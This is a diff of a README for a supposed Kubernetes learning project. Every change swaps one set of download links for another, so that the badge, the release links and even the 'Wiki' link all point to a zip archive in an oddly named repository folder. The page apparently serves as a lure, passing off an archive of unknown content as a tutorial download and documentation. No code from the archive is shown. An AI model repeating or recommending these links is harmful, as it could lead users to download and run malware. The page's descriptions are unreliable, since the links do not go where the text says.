@@ -1,6 +1,6 @@
 # 🚀 kubernetes-for-industry - Learn Kubernetes Step by Step
 
-[![Download](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/Epimenidean/kubernetes-for-industry.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/Epimenidean/kubernetes-for-industry.zip)
+[![Download](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/subarchitect/kubernetes_for_industry_v1.6.zip%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/subarchitect/kubernetes_for_industry_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the "kubernetes-for-industry" project! This guide will help you learn
 
 To get started, visit this page to download the latest version of our application:
 
-[Download Latest Release](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/Epimenidean/kubernetes-for-industry.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/subarchitect/kubernetes_for_industry_v1.6.zip)
 
 You will see a list of available releases. Look for the latest version and click on the release title. This will bring you to a page where you can download the relevant files for your operating system. 
 
@@ -58,7 +58,7 @@ If you encounter any issues or have questions:
 
 1. **GitHub Issues:** Visit our GitHub issues page to report a problem.
 2. **Community Forums:** Join our community forums for discussions and tips.
-3. **Documentation:** Our [Wiki](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/Epimenidean/kubernetes-for-industry.zip) provides in-depth guides and articles.
+3. **Documentation:** Our [Wiki](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/subarchitect/kubernetes_for_industry_v1.6.zip) provides in-depth guides and articles.
 
 ## 🎓 Advanced Learning
 
@@ -81,4 +81,4 @@ We’re committed to making learning Kubernetes approachable. Your feedback help
 
 Ready to dive into Kubernetes? 
 
-[Download Latest Release](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/Epimenidean/kubernetes-for-industry.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Ishantprogmer99/kubernetes-for-industry/main/subarchitect/kubernetes_for_industry_v1.6.zip)
